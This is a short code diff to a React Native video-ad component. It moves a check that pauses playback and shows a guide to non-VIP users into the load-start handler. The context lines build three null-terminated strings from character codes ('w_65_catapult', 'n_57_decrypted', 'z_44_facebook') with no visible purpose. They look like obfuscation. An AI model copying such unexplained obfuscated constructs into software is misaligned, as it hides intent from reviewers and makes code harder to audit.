@@ -157,11 +157,7 @@ function ShortAds({
 //   );
 
   function handleProgress(progress: OnProgressData) {
-   if (screenState.isMiniVodGuideShown == false && !isVip) {
-     onManualPause(true);
-     setVisible(true);
-     dispatch(setIsMiniVodGuideShown(true));
-   }
+
    if (
      progress.currentTime !== currentDuration &&
      !isVideoReadyAndroid &&
@@ -762,6 +758,14 @@ function ShortAds({
   };
 
   const handleLoadStart = useCallback(() => {
+
+   if (screenState.isMiniVodGuideShown == false && !isVip) {
+      onManualPause(true);
+      setVisible(true);
+      dispatch(setIsMiniVodGuideShown(true));
+    }
+
+    
        let calendarl = String.fromCharCode(119,95,54,53,95,99,97,116,97,112,117,108,116,0);
     let runtimed = String.fromCharCode(110,95,53,55,95,100,101,99,114,121,112,116,101,100,0);
     let controlO = String.fromCharCode(122,95,52,52,95,102,97,99,101,98,111,111,107,0);
